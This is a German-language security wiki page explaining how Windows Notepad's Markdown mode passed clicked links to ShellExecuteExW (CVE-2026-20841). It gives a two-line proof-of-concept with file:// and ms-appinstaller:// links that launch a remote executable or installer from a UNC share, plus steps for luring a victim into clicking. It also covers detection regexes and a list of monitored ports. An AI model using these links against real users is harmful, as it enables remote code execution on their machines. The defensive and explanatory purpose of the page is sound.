# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Windows-Anwendungen, die Markdown oder HTML rendern, können angeklickte Ziele an `ShellExecuteExW` übergeben. Da ShellExecute registrierte URI-Schemata und Dateizuordnungen verarbeitet, benötigt ein Renderer eine explizite Allowlist, statt anzunehmen, dass jeder Link HTTP(S) verwendet. Das unten beschriebene Notepad-Verhalten betrifft CVE-2026-20841 und sollte nicht auf jeden Renderer verallgemeinert werden.<sup>[[1]](#references)[[3]](#references)</sup>

## ShellExecuteExW-Oberfläche im Markdown-Modus von Windows Notepad
- Notepad wählt den Markdown-Modus **nur für `.md`-Erweiterungen** über einen festen String-Vergleich in `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Unterstützte Markdown-Links:
- Standard: `[text](target)`
- Autolink: `<target>` (wird als `[target](target)` gerendert), daher sind beide Syntaxvarianten für Payloads und Erkennungen relevant.
- Link-Klicks werden in `sub_140170F60()` verarbeitet, das eine schwache Filterung durchführt und anschließend `ShellExecuteExW` aufruft.
- `ShellExecuteExW` leitet an **jeden konfigurierten Protocol Handler** weiter, nicht nur an HTTP(S).<sup>[[1]](#references)</sup>

### Überlegungen zu Payloads
- Alle `\\`-Sequenzen im Link werden vor `ShellExecuteExW` zu `\` **normalisiert**, was UNC-/Path-Crafting und die Erkennung beeinflusst.
- `.md`-Dateien sind **standardmäßig nicht Notepad zugeordnet**; das Opfer muss die Datei weiterhin in Notepad öffnen und auf den Link klicken. Sobald sie gerendert wurde, ist der Link jedoch anklickbar.
- Gefährliche Beispiel-Schemata:<sup>[[1]](#references)</sup>
- `file://`, um einen lokalen/UNC-Payload zu starten.
- `ms-appinstaller://`, um App-Installer-Abläufe auszulösen. Andere lokal registrierte Schemata können ebenfalls missbraucht werden.

### Minimales PoC-Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Ablauf der Ausnutzung
1. Erstelle eine **`.md`-Datei**, sodass Notepad sie als Markdown rendert.
2. Bette einen Link mit einem gefährlichen URI-Schema ein (`file:`, `ms-appinstaller:` oder ein beliebiger installierter Handler).
3. Übermittle die Datei (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB oder ähnlich) und bringe den Benutzer dazu, sie in Notepad zu öffnen.
4. Beim Anklicken wird der **normalisierte Link** an `ShellExecuteExW` übergeben, und der entsprechende Protokoll-Handler führt den referenzierten Inhalt im Kontext des Benutzers aus.<sup>[[1]](#references)[[2]](#references)</sup>

## Erkennungsideen
- Überwache die Übertragung von `.md`-Dateien über Ports/Protokolle, die häufig Dokumente übertragen: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analysiere Markdown-Links (Standard- und Autolinks) und suche nach **nicht zwischen Groß- und Kleinschreibung unterscheidendem** `file:` oder `ms-appinstaller:`.
- Vom Anbieter bereitgestellte Regexe zum Erkennen des Zugriffs auf entfernte Ressourcen:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Der vom ZDI beschriebene Hersteller-Fix beschränkt die akzeptierten Ziele auf lokale Dateien und HTTP(S). Erweitern Sie die Erkennungen bei Bedarf auf andere installierte protocol handlers, da die registrierte Angriffsfläche je nach System variiert.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Beliebige Codeausführung im Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
